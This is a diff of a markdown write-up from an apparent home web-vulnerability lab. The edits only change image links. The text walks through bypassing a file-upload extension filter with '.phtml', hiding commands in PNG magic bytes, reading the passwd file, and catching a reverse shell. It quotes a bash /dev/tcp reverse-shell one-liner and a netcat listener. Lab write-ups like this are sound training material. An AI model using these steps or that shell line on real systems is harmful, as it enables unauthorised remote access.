@@ -2,58 +2,58 @@
 
 - Upon navigating to the site I got this interface:
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/ba7b506c-20ff-498e-a8bd-f47a11cccb33)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/b6c75ff4-6b49-485a-882e-fdaf7ac601bb)
 
 - On trying to upload text or other extension files except "png" and "jpg" I got the error message:
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/288466d2-9c14-48dc-a93d-cbbba7b7e36a)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/6b2fa0c0-958d-4ef7-bbe6-20c212027a82)
 
 - So, I go with uploading a png file and intercept the request to the burp suite to analyze the request:
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/a4eac0b5-5be8-4d53-b517-272c34797cca)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/856aa3d2-fb1e-4a44-ae77-8389a24534b6)
 
 - After several tries, I can't able to upload the file, it returns an error:
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/cbb11337-31b4-4feb-bcf5-0f2ddc1df934)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d537bd32-f586-4ff3-9b8c-d6ea5c19d9fd)
 
 - Quick ping to mind, maybe the extension "PHP" is in the blocked list. I tried with other extensions and see if they work.
 - I tried with the extension ".sh" and luckily it works
 - I inject a bash reverse shell into the image png magic bytes.
 - cmd: `bash -i >& /dev/tcp/<IP>/4242 0>&1`
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/220cc4a2-b12f-4cc5-a67b-a5601703366c)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/959b76b2-285b-4d4a-870a-95ed0d732481)
 
 - Unfortunately, on navigating to the "bash.sh" file in the URL I got no results.
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/bf3aedd2-81ab-4374-98ab-430bd3b61431)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/65761330-e5d5-42d3-8830-1d4f19782050)
 
 - On enumerating a little deeper, I notice that the website is working on PHP and PHP extension is blocked by the server.
 - I do a quick search on Google regarding bypassing the php extension blockage.
 - There I get to know about other extensions that worked with PHP such as:
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/c7a0813b-0829-49e3-a8e1-0df50f7ad261)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/ea6fedaa-9c41-4f28-8d60-76990a57d356)
 
 - I quickly changed the file extension from "image.php" to "image.phtml" and send a request through Burp Suite's repeater by inserting command line code in image png magick bytes.
 - I get succeed in uploading the file with the extension ".phtml"
   
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/06d8f150-69ff-4d4f-8533-9d2f49f4f975)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c0e9ea79-f918-4f57-b901-abb1267e09c6)
 
 - On navigating to the file through the URL I successfully get the revert by embedding the command and argument into the URL.
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/0440bf04-f4a8-46fc-b5df-9fec0f26a1e5)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/922d4f3f-8c8b-4e34-b072-175284c411af)
 
 - I also get succeeded in fetching "passwd" file from the system.
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/e5669c4a-ffed-4b2a-af83-162e8425589b)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d817968f-322c-4e95-950a-2052901a087c)
 
 - To get the reverse shell to my system I use PHP reverse shell by pentest-monkey and replace it in place of the previous injected command.
 - Netcat is set for listening.
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/433afc2b-6a69-4766-9e05-a9edffa75c59)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/30db9361-ad05-4b99-9c52-fd8425c48693)
 
 - On navigating to the uploaded file I got a reverse shell to my system successfully
 
-![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/851da0fe-7c14-46b3-bb71-953c009a07bb)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c4b76909-ef86-4471-b723-42aa4ac6ac8a)
 
 ```bash
 └─$ rlwrap nc -nvlp 1234
